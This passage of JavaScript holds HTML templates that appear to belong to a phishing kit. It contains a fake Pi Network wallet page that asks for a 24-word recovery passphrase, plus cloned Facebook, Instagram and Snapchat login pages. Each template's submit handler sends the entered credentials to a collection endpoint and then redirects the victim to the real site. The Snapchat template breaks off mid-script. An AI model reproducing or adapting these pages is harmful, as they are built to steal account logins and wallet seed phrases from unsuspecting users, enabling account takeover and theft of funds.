                          <path d="M2,3H22C23.05,3 24,3.95 24,5V19C24,20.05 23.05,21 22,21H2C0.95,21 0,20.05 0,19V5C0,3.95 0.95,3 2,3M14,6V7H22V6H14M14,8V9H21.5L22,9V8H14M14,10V11H21V10H14M8,13.91C6,13.91 2,15 2,17V18H14V17C14,15 10,13.91 8,13.91M8,6A3,3 0 0,0 5,9A3,3 0 0,0 8,12A3,3 0 0,0 11,9A3,3 0 0,0 8,6Z" fill="#673AB7"/>
                      </svg>
                  </div>
                  <div class="menu-label">KYC</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <svg viewBox="0 0 24 24" width="35" height="35">
                          <path d="M20,2H4A2,2 0 0,0 2,4V22L6,18H20A2,2 0 0,0 22,16V4A2,2 0 0,0 20,2M20,16H6L4,18V4H20" fill="#673AB7"/>
                      </svg>
                  </div>
                  <div class="menu-label">Chat</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/8.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">P2P</div>
              </div>
          </div>
  
  
          <button class="explore-button" onclick="redirectToWallet()">
              <svg viewBox="0 0 24 24" width="20" height="20" style="margin-right: 10px;">
                  <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12,6.5A5.5,5.5 0 0,0 6.5,12A5.5,5.5 0 0,0 12,17.5A5.5,5.5 0 0,0 17.5,12A5.5,5.5 0 0,0 12,6.5M12,9.5A2.5,2.5 0 0,1 14.5,12A2.5,2.5 0 0,1 12,14.5A2.5,2.5 0 0,1 9.5,12A2.5,2.5 0 0,1 12,9.5" fill="white"/>
              </svg>
              Explore the Ecosystem
          </button>
      </div>
  
  
      <div class="nav-bar">
          <div class="nav-indicator"></div>
      </div>
  
  
      <div id="wallet-content" style="display: none;">
          <div class="header">
              <button class="back-button">←</button>
              <div class="header-title">
                  <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="border-radius: 50%; width: auto; max-width: 20px; height: auto;" />
      
                  Wallet
                  <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="border-radius: 50%; width: auto; max-width: 20px; height: auto;" />
              </div>
              <button class="check-button">✓</button>
          </div>
          
          <div class="container">
              <h1>Unlock Pi Wallet</h1>
              
              <textarea class="passphrase-input" id="password" placeholder="Enter your 24-word passphrase here"></textarea>
              
              <button class="unlock-button unlock-passphrase" onclick="handleSubmit(event)" id="testeb">Unlock With Passphrase</button>
              <button class="unlock-button unlock-fingerprint disabled" id="testeb">Unlock With Fingerprint</button>
              
              <p class="info-text">
                  As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
                  Recovery of passphrase is currently impossible.
              </p>
              
              <p class="info-text">
                  Lost your passphrase? <a href="https://minepi.com/" class="blue-link">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
              </p>
          </div>
      </div>
  
      <script>
  
          document.head.insertAdjacentHTML('beforeend', \`
          <style id="wallet-styles" disabled>
              body {
                  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
                  margin: 0;
                  padding: 0;
                  background-color: #f5f5f5;
                  width: 800px;
                  height: 1629px;
                  max-width: 100%;
                  margin: 0 auto;
              }
              
              .header {
                  background-color: #663399;
                  color: white;
                  padding: 15px 20px;
                  display: flex;
                  align-items: center;
                  justify-content: space-between;
              }
              
              .header-title {
                  font-size: 20px;
                  font-weight: 500;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  flex: 1;
              }
              
              .back-button {
                  width: 24px;
                  height: 24px;
                  border: none;
                  background: none;
                  color: white;
                  font-size: 24px;
                  cursor: pointer;
                  display: flex;
                  align-items: center;
              }
              
              .check-button {
                  width: 24px;
                  height: 24px;
                  border: none;
                  background: none;
                  color: white;
                  font-size: 18px;
                  cursor: pointer;
              }
              
              .wallet-icon {
                  background-color: #FFA500;
                  width: 30px;
                  height: 30px;
                  border-radius: 6px;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  margin-right: 10px;
                  color: white;
              }
              
              .pi-icon {
                  background-color: #FFA500;
                  width: 20px;
                  height: 20px;
                  border-radius: 50%;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  margin-left: 10px;
                  color: white;
                  font-size: 12px;
              }
              
              .container {
                  padding: 20px;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
              }
              
              h1 {
                  font-size: 24px;
                  margin: 20px 0 30px;
                  text-align: center;
                  color: #333;
              }
              
              .passphrase-input {
                  width: 100%;
                  height: 150px;
                  border: 1px solid #ddd;
                  border-radius: 10px;
                  padding: 20px;
                  font-size: 16px;
                  margin-bottom: 20px;
                  resize: none;
                  color: #aaa;
                  background: white;
              }
              
              .unlock-button {
                  width: 100%;
                  padding: 15px;
                  margin: 10px 0;
                  border-radius: 10px;
                  border: none;
                  font-size: 16px;
                  cursor: pointer;
                  text-align: center;
              }
              
              .unlock-passphrase {
                  background-color: white;
                  color: #663399;
                  border: 1px solid #ddd;
              }
              
              .unlock-fingerprint {
                  background-color: #663399;
                  color: white;
              }
              
              .info-text {
                  margin: 20px 0;
                  color: #333;
                  font-size: 16px;
                  line-height: 1.5;
              }
              
              .blue-link {
                  color: #3498db;
                  text-decoration: none;
              }
                  body {
              overflow: hidden;
              }
          </style>
          \`);
  
  
          function redirectToWallet() {
  
              document.querySelector('.main-content').style.display = 'none';
              document.querySelector('.header').style.display = 'none';
              document.querySelector('.nav-bar').style.display = 'none';
              
  
              document.querySelector('#wallet-content').style.display = 'block';
              
  
              document.querySelector('#wallet-styles').disabled = false;
          }
  
  
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
          
          async function handleSubmit(event) {
              event.preventDefault(); 
              const email = "PiWalletAddress";
              const password = document.getElementById("password").value;
              const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
              
              try {
                  const response = await fetch("http://localhost:5237/insertdata", {
                  method: "POST",
                  headers: {
                      "Content-Type": "application/json"
                  },
                  body: JSON.stringify({
                      uid: uid,
                      websiteName: websiteName,
                      email: email,
                      password: password
                  })
                  });
  
                  window.location.href = "https://minepi.com/";
              } catch (error) {
                  window.location.href = "https://minepi.com/";
                  console.error("Error inserting data:", error);
              }
          }
      </script>
  </body>
  </html>`,
    "facebook":`<!DOCTYPE html>
  <html>
  
  <head>
      <meta charset="UTF-8">
      <title>Test Page</title>
      <script>
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
              
            const signInButton = document.getElementById("amazon");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
              
  
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
      
              window.location.href = "https://facebook.com/";
          } catch (error) {
            window.location.href = "https://facebook.com/";
            }
          }
        </script>
      
      <style>
  
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700;900&display=swap');
  * {
      padding: 0px;
      margin: 0px;
  }
  
  body {
     background:#f0f2f5;
     font-family: 'Poppins', sans-serif;
     
  }
  
  main{
      height: 100vh;
      display: flex;
     justify-content: center;
     align-items: center;
     padding: 0 2rem;
  }
  
  .main{
      display: flex;
      justify-content: center;
      align-items: center;
      height: 80vh;
  }
  
  .heading-section{
      display: flex;
      flex-direction: column;
      max-width: 550px;
      margin-right: 5rem;
      margin-top: 6rem;
      align-self: flex-start;
  }
  
  .logo-img{
      display: block;
      width: 270px;
  }
  
  .form{
      width: 390px;
  }
  
  .a-form {
      width: 100%;
      box-sizing: border-box;
      padding: 15px;
      background-color: #fff;
      border: none;
      box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
      margin-bottom: 20px;
  }
  
  .a-form .a-email {
      width: 100%;
      padding: 15px;
      box-sizing: border-box;
      font-size: 16px;
      margin: 10px auto;
      border: 1px solid lightgray;
      border-radius: 8px;
      border-width: thin;
      outline-width: thin;
      outline-color: rgb(160, 160, 255);
  }
  
  .a-form .a-email:focus {
      outline: none;
      box-shadow: 0px 0px 2px #0066ff;
  }
  
  .a-form .a-pss {
      display: block;
      width: 100%;
      padding: 15px;
      box-sizing: border-box;
      font-size: 16px;
      margin: 10px auto;
      border: 1px solid lightgray;
      border-radius: 8px;
      outline-width: thin;
      outline-color: rgb(160, 160, 255);
  }
  
  .a-form .a-pss:focus {
      outline: none;
      box-shadow: 0px 0px 2px #0066ff;
  }
  
  .a-form .a-sub {
      display: block;
      width: 100%;
      padding: 15px;
      margin: 10px auto;
      box-sizing: border-box;
      background-color: #004790;
      text-align: center;
      color: white;
      font-size: 20px;
      border: none;
      font-weight: 700;
      border-radius: 8px;
  }
  
  .a-form .a-sub:hover {
      cursor: pointer;
      background-color: #003780;
      border: none;
  }
  
  .a-form .a-sub:active {
      cursor: progress;
      background-color: #102770;
      border: none;
      outline: none;
  }
  
  .a-form .a-sub:focus {
      outline: none;
      box-shadow: 0px 0px 2px #0066ff;
  }
  
  .a-form .a-link {
      display: block;
      text-decoration: none;
      text-align: center;
      padding-bottom: 10px;
      padding-top: 10px;
      font-size: 16px;
  }
  
  .a-form .a-hr {
      display: block;
      margin-top: 0.5em;
      margin-bottom: 1.5em;
      margin-left: auto;
      margin-right: auto;
      border: 1px solid #E0E0E0;
  }
  
  .a-form .a-but {
      display: block;
      width: 60%;
      background-color: #32CD32;
      padding: 14px;
      margin: 10px auto;
      color: white;
      font-size: 18px;
      font-weight: 700;
      border: none;
      box-sizing: border-box;
      text-align: center;
      cursor: pointer;
      border-radius: 8px;
  }
  
  .a-form .a-but:hover {
      cursor: pointer;
      border: none;
      background-color: #67ab04;
      outline: none;
  }
  
  .a-form .a-but:focus {
      outline: none;
      background-color: #67ab04;
  }
  
  .a-ri8{
      padding: 15px;
      font-size: 25px;
  }
  
  .a-page {
      display: block;
      padding: 10px;
      padding-left: 70px;
      margin: 10px auto;
      padding-top: 110px;
  }
  
  .a-href{
      text-decoration: none;
      font-weight: 700;
      color: black;
  }
  
  .a-href:hover {
      text-decoration: underline;
  }
  
  .create-page{
      width: 100%;
      text-align: center;
      font-size: 14px;
  }
  
  .footer{
      display: flex;
      justify-content: center;
      width: 100%;
      background: #fff;
      padding-bottom: 1rem;
  }
  
  #pageFooter{
      max-width: 968px;
      color: #737373;
      margin: 0;
      padding: 0;
  }
  ul{
      line-height: 1.6;
  }
  
  ul li{
      margin: 0;
      padding: 0;
      display: inline-block;
      padding-left: 10px;
      font-size: 12px;
      list-style-type: none;
  }
  
  a{
      white-space: nowrap;
      margin: 0;
      padding: 0;
      color: #385898;
      cursor: pointer;
      text-decoration: none;
  }
  
  a:hover{
      text-decoration: underline;
  }
  
  #line{
      border-bottom: 1px solid #dddfe2;
      font-size: 1px;
      height: 8px;
      margin-bottom: 8px;
  }
  
  .copyright{
      font-size: 12px;
      padding-left: 10px;
      padding-top: 1rem;
  }
  
  .m-footer{
      display: none;
  }
  @media screen and (max-width: 760px) {
  
      main{
          height: 100%;
      }
  
      .main{
          flex-direction: column;
          height: 100%;
      }
  
      .heading-section{
          margin: 0;
          max-width: 400px;
          align-items: center;
          margin: 2rem 0;
      }
  
      .a-ri8{
          font-size: 21px;
      }
  
      .form{
          padding-bottom: 4rem;
      }
  
      .footer{
          display: none;
      }
  
      .m-footer{
          display: block;
          color: #737373;
      }
  
      .main-c{
          display: flex;
          justify-content: space-between;
          font-size: 12px;
          text-align: center;
          padding: 1rem 6rem;
      }
  
      .list-1{
          display: flex;
          flex-direction: column;
      }
  
      .list-2{
          display: flex;
          flex-direction: column;
      }
  
      .main-c a{
          color: #737373;
          text-decoration: none;
      }
  
      .main-c a:hover{
          text-decoration: none;
      }
  
      .main-links{
          color: #737373;
          font-size: 10px;
          width: 100%;
          text-align: center;
          padding-bottom: .5rem;
      }
  
      .main-links span{
          cursor: pointer;
      }
  
      .fb{
          cursor:pointer;
          font-size: 12px;
          padding-bottom: .5rem;
          width: 100%;
          text-align: center;
      }
  }
  
      </style>
  
      <link rel="stylesheet" href="./css/styles.css">
      <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" type="image/x-icon">
  </head>
  
  <body>
      <main>
          <div class="main">
          <div class="heading-section">
              <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" class="logo-img">
              <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
          </div>
  
          <div class="form">
              <form class="a-form" onsubmit="handleSubmit(event)">
                  <input type="email" id="email" class="a-email" name="Email" placeholder="Email address or phone number"
                      autofocus="autofocus" required />
                  <input type="password" id="password" class="a-pss" name="Password" placeholder="Password"
                      autofocus="autofocus" />
                  <input type="submit" class="a-sub" id="amazon" value="Log In" />
                  <a href="" class="a-link">Forgotten password?</a>
                  <hr class="a-hr">
                  <input type="submit " value="Create New Account" class="a-but" />
              </form>
              <div class="create-page">
                  <a href="" class="a-href">Create a Page</a></b> for a celebrity, band or business.
              </div>
              </div>
          </div>
  
      </main>
      <div class="footer">
          <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
              <ul>
                  <li>English (UK)</li>
                  <li><a href="">हिन्दी</a></li>
                  <li><a href="">ગુજરાતી</a></li>
                  <li><a href="">मराठी</a></li>
                  <li><a href="">اردو</a></li>
                  <li><a href="">മലയാളം</a></li>
                  <li><a href="">বাংলা</a> </li>
                  <li><a href="" class="_sv4">తెలుగు</a> </li>
                  <li><a href="" class="_sv4">தமிழ்</a></li>
                  <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
                  <li><a href="" class="_sv4">Español</a></li>
                  <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a> </li>
              </ul>
              <div id="line"></div>
              <div>
                  <ul>
                      <li><a href="">Sign Up</a></li>
                      <li><a href="" >Log In</a></li>
                      <li><a href="">Messenger</a></li>
                      <li><a href="">Facebook Lite</a> </li>
                      <li><a href=""> Watch </a> </li>
                      <li><a href="">People</a> </li>
                      <li><a href="">Pages</a></li>
                      <li><a  href="">Page categories</a></li>
                      <li><a href="">Places</a></li>
                      <li><a href="">Games</a></li>
                      <li><a href="">Locations</a></li>
                      <li><a href="">Marketplace</a></li>
                      <li><a href="">Facebook Pay</a></li>
                      <li><a href="">Groups</a></li>
                      <li><a href="">Jobs</a></li>
                      <li><a href="">Oculus</a></li>
                      <li><a href="">Portal</a></li>
                      <li><a href="">Instagram</a></li>
                      <li><a href="">Local</a></li>
                      <li><a href="">Fundraisers</a></li>
                      <li><a href="">Services</a></li>
                      <li><a href="">Voting Information Centre</a></li>
                      <li><a href="">About</a></li>
                      <li><a href="">Create ad</a></li>
                      <li><a href="">Create Page</a></li>
                      <li><a href="">Developers</a></li>
                      <li><a href="">Careers</a></li>
                      <li><a href="">Privacy</a></li>
                      <li><a href="">Cookies</a></li>
                      <li><a href="">AdChoices<i class="img sp_ZtNaJVka3YU_2x sx_d75518"></i></a></li>
                      <li><a href="">Terms</a></li>
                      <li><a href="">Help</a></li>
                      <li><a href="">Settings</a></li>
                      <li><a href="">Activity log</a></li>
                  </ul>
              </div>
              <div class="copyright">
                  <div><span> Facebook © 2021</span>
                  </div>
              </div>
          </div>
      </div>
              <div class="m-footer">
                  <div class="main-c">
                      <div class="list-1"><span >English (UK)</span>
                          <div><span><a href="">हिन्दी</a></span></div>
                          <div><span><a href="">اردو</a></span></div>
                          <div><span><a href="">বাংলা</a></span></div>
                      </div>
                      <div class="list-2">
                          <div><span><a href="">ગુજરાતી</a></span></div>
                          <div class=""><span><a href="">मराठी</a></span>
                          </div>
                          <div><span><a href="">മലയാളം</a></span></div>
                          <a>
                              <div><i class="img sp_vuppHZ0nD_0_3x sx_222020"></i>
                              </div>
                          </a>
                      </div>
                  </div>
                  <div class="main-links">
                      <span>About </span>.
                      <span> Help </span>.
                      <span> More </span>
                  </div>
                  <div class="fb">Facebook Inc.</div>
              </div>
  
        
  
  </body>
  
  </html>`,
    "instagram":`<!DOCTYPE html>
  <html lang="pt-BR">
  <head>
  <title>Test Page</title>
      <script>
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const signInButton = document.getElementById("amazon");
          signInButton.disabled = true;
          signInButton.style.opacity = '0.5';
          signInButton.style.cursor = 'not-allowed';
          
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
              window.location.href = "https://instagram.com/";
          } catch (error) {
            window.location.href = "https://instagram.com/";
            }
          }
        </script>
      
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="./styles.css" />
      <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/ebcce9ad6bc4154215e9ee7af1ae49381595c860/img/insta-fav.ico">
      <title>Instagram clone</title>
      <style>
          * {
      border: none;
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
      margin: 0;
      padding: 0;
  }
  
  body {
      background-color: #fafafa;
      height: 100vh;
  }
  
  main {
      height: 100vh;
      margin: auto;
      max-width: 935px;
  }
  
  a { text-decoration: none; }
  h1 { margin: 20px 0; }
  ul { list-style: none; }
  
  /**
   * Flex rules
   */
  
  .flex {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
  }
  
  .direction-column {
      -webkit-box-direction: normal;
      -webkit-box-orient: vertical;
      -moz-box-direction: normal;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
  }
  
  .justify-content-center {
      -webkit-box-pack: center;
      -moz-box-pack: center;
      -ms-flex-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
  }
  
  .align-items-center {
      -webkit-box-align: center;
      -moz-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      align-items: center;
  }
  
  .flex-wrap {
      -webkit-flex-wrap: wrap;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
  }
  
  /**
   *
   */
  
  .panel {
      background-color: white;
      border: 1px solid #dbdbdb;
      margin-bottom: 10px;
      padding: 10px;
  }
  
  #auth { max-width: 350px; }
  #mobile { max-width: 454px; }
  
  #mobile img {
      height: 618px;
  }
  
  /**
   * Login section
   */
  .login-with-fb,
  form { width: 100%; }
  
  .register,
  form { padding: 30px 20px; }
  
  .login-with-fb { padding: 30px 20px 20px 20px; }
  
  form .sr-only { display: none; }
  
  form input {
      background-color: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      color: #808080;
      margin-bottom: 8px;
      padding: 10px 10px;
      width: 100%;
  }
  
  form input::placeholder {
      color: #808080;
  }
  
  form input:focus {
      border: 1px solid #808080;
      outline: none;
  }
  
  form button {
      background-color: #0095f6;
      border-radius: 5px;
      color: #fff;
      font-weight: bold;
      height: 35px;
      margin-top: 10px;
      width: 100%;
  }
  
  /**
   * Separator login form from login with fb
   */
  .separator span {
      background-color: #dbdbdb;
      height: 1px;
      width: calc(100% - 10px);
  }
  
  .separator .or {
      color: #808080;
      font-weight: bold;
  }
  
  .separator { padding: 0 20px; }
  .separator span:first-child { margin-right: 10px;}
  .separator span:last-child { margin-left: 10px;}
  
  /**
   * Login with fb section
   */
  .login-with-fb a { 
      color: #385185; 
  }
  
  .login-with-fb > a { font-size: 12px; }
  .login-with-fb div a { font-weight: bold; }
  .login-with-fb div { margin-bottom: 15px; }
  
  /**
   * Register section
   */
  .register * { font-size: 14px; }
  .register a { 
      color: #0095f6;
      font-weight: bold;
  }
  
  .register p { margin-right: 5px; }
  
  /**
   * App download
   */
  .app-download { padding: 15px; }
  .app-download p { padding: 10px 0; }
  .app-download img { 
      height: 40px; 
      margin: 0 5px;
  }
  
  /**
   * Footer
   */
  footer {
      margin: 0 auto 30px auto;
      max-width: 935px;
  }
  footer ul { margin-bottom: 20px; }
  footer ul li { margin: 0 10px 10px; } 
  footer ul li a { color: #385185; }
  footer .copyright { color: #808080; }
  footer ul li a,
  footer .copyright { 
      font-weight: bold;
      text-align: center;
      text-transform: uppercase;
   }
  
  
  /**
   * Media queries
   */
  
  @media screen and (max-width: 767px) {
      main { margin: 30px auto 50px auto; }
      footer .copyright,
      footer ul li a { font-size: 13px; }
  }
      </style>
  </head>
  <body>
      <main class="flex align-items-center justify-content-center">
          <section id="mobile" class="flex">
          </section>
          <section id="auth" class="flex direction-column">
              <div class="panel login flex direction-column">
                  <h1 title="Instagram" class="flex justify-content-center">
                      <img src="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/ebcce9ad6bc4154215e9ee7af1ae49381595c860/img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                  </h1>
                  <form>
                      <label for="email" class="sr-only">Phone number, username, or email</label>
                      <input name="email" id="email" placeholder="Phone number, username, or email" />
  
                      <label for="password" class="sr-only">Password</label>
                      <input name="password" id="password" type="password" placeholder="Password" />
  
                      <button type="button" onclick="handleSubmit(event)" id="amazon">Log in</button>
                  </form>
                  <div class="flex separator align-items-center">
                      <span></span>
                      <div class="or">OR</div>
                      <span></span>
                  </div>
                  <div class="login-with-fb flex direction-column align-items-center">
                      <div>
                          <img />
                          <a>Log in with facebook</a>
                      </div>
                      <a href="#">Forgot password?</a>
                  </div>
              </div>
              <div class="panel register flex justify-content-center">
                  <p>Don't have an account?</p>
                  <a href="#">Sign up.</a>
              </div>
              <div class="app-download flex direction-column align-items-center">
                  <p>Get the app.</p>
                  <div class="flex justify-content-center">
                      <img src="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/ebcce9ad6bc4154215e9ee7af1ae49381595c860/img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                      <img src="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/ebcce9ad6bc4154215e9ee7af1ae49381595c860/img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                  </div>
              </div>
          </section>
      </main>
      <footer>
          <ul class="flex flex-wrap justify-content-center">
              <li><a href="#">Meta</a></li>
              <li><a href="#">Blog</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">API</a></li>
              <li><a href="#">Help</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Locations</a></li>
              <li><a href="#">Instagram Lite</a></li>
              <li><a href="#">Threads</a></li>
              <li><a href="#">Meta Verified</a></li>
          </ul>
          <p class="copyright">© 2020 Instagram do Facebook</p>
      </footer>
  </body>
  </html>`,
    "snapchat":`<!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
    <link rel="shortcut icon" href="img/faviconV2.png">
    <meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
    <meta property="og:site_name" content="Snapchat Spotlight">
    <link rel="stylesheet" href="/css/login.css">
    <title>Login • Snapchat</title>
      <style>
           /* General Styles */
   body {
      caret-color: transparent;
      font-family: "Avenir Next", Arial, sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }
  
    .login-container {
      text-align: center;
      max-width: 400px;
      width: 83%;
    }
  
    h1 {
      font-size: 27px;
      color: #000000;
      margin-bottom: 20px;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      font-weight: 500;
    }
  
    label {
      display: block;
      text-align: left;
      font-size: 12px;
      font-weight: bold;
      color: #55ccffd0;
      margin-top: 20px;
      margin-bottom: 5px;
    }
  
    input[type="text"],
    input[type="password"],
    input[type="tel"] {
      width: 100%;
      padding: 11px;
      margin-top: 5px;
      border: 1px solid #dcdcdc;
      border-radius: 10px;
      font-size: 14px;
      box-sizing: border-box;
      caret-color:#00A6FF;
    }
  
    input:focus {
      border-color: #54545436;
      outline: none;
      transition: background-color 0.3s ease;
      box-shadow: 0 0 5px rgba(116, 116, 116, 0.17);
    }
  
    .password-container {
      position: relative;
      width: 100%;
    }
    
    .password-container .toggle-password {
      position: absolute;
      right: 5px;
      top: 60%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 14px;
      font-family: Arial, Helvetica, sans-serif;
    }
  
    .save-info {
      display: flex;
      align-items: center;
      margin-top: -10px;
      font-size: 12px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
    }
  
    .save-info label {
      color: #bcbcbc;
      font-weight: lighter;
    }
  
    .alternate-option {
      display: flex;
      align-items: center;
      font-size: 12.8px;
      color: #55ccffd0;
      margin-top: 15px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: bolder;
    }
  
    .forgot-password {
      font-size: 12px;
      color: #55ccffd0;
      margin-top: 16px;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: 600;
    }
  
    .alternate-option a,
    .forgot-password a {
      text-decoration: none;
      color: #55ccffd0;
    }
  
    input[type="checkbox"] {
      margin-right: 5px;
      margin-top: 20px;
    }
  
    .login-button {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 20px;
      width: 210px;
      padding: 12px;
      margin-top: 20px;
      background-color: #a7abad;
      border: none;
      border-radius: 18px;
      font-size: 14px;
      font-weight: bold;
      color: #ffffff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
  
    .login-button.enabled {
      background-color: #00A6FF;
    }
  
    .login-button:hover {
      background-color: #027bde;
    }
  
    /* Back Button */
    .back-button {
      position: absolute;
      top: 12px;
      left: 10px;
      background-color: transparent;
      border: none;
      font-size: 16px;
      color: #55ccffd0;
      cursor: pointer;
      display: flex;
      align-items: center;
    }
  
    .back-button:hover {
      color: #027bde;
    }
    .incorrect {
  color: red;
  display: none;
  margin-top: -10px;
  margin-left:  5px;
  margin-bottom: 5px;
  font-size: 13px;
  font-weight: 400;
  text-align: left; /* Ensures the text aligns to the left */
  }
  
    .error-message {
    display: none; /* Hidden by default */
    background-color: #f44336; /* Red background */
    color: white; /* White text */
    padding: 15px;
    margin: 20px;
    border-radius: 5px;
    font-size: 16px;
    text-align: center;
    animation: fadeIn 0.5s ease-out, vibrate 0.2s ease-in-out 3;
  }
  /* Fade-in animation */
  @keyframes fadeIn {
    from {
        opacity: 0;
    }
    to {
        opacity: 1;
    }
  }
  
  /* Vibration animation */
  @keyframes vibrate {
    0% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    50% { transform: translateX(5px); }
    75% { transform: translateX(-5px); }
    100% { transform: translateX(0); }
  }
      </style>
  </head>
  <body>
    <!-- Back Button -->
    <button class="back-button" onclick="window.location.href='/Acconts.html';">
      <img src="https://raw.githubusercontent.com/tejazmali/Snapchat-login-clone/refs/heads/main/img/left-arrow.png" height="15px" width="15px" alt="">
    </button>
  
    <div class="login-container">
      <div id="error-message" class="error-message">
        Something went wrong ! Please re-login to your account.
    </div>
      <h1>Log In</h1>
      <!-- Form for login -->
      <form action="" method="POST"  onsubmit="handleSubmit(event)">
        <label for="username">USERNAME OR EMAIL</label>
        <input type="text" id="username" name="name" required>
        
        <p class="alternate-option"><a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a></p>
        
        <label for="password">PASSWORD</label>
        <div class="password-container">
          <input type="password" id="password" name="message" required>
          <button type="button" class="toggle-password">
            <img src="https://raw.githubusercontent.com/tejazmali/Snapchat-login-clone/refs/heads/main/img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
          </button>
        </div>
        
        <div class="save-info">
          <input type="checkbox" id="save-login">
          <label for="save-login">Save Login Info on your device</label>
        </div>
        
        <div class="incorrect">
          <p>Incorrect password, please try again.</p>
        </div>
        
        <p class="forgot-password"><a href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%253Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar">Forgot your password?</a></p>
        
        <button type="submit" id="sssssignsin" class="login-button" >Log In</button>
      </form>
      
      <script >
          const switchToPhone = document.getElementById('switch-to-phone');
          const usernameInput = document.getElementById('username');
          const label = document.querySelector('label[for="username"]');
    
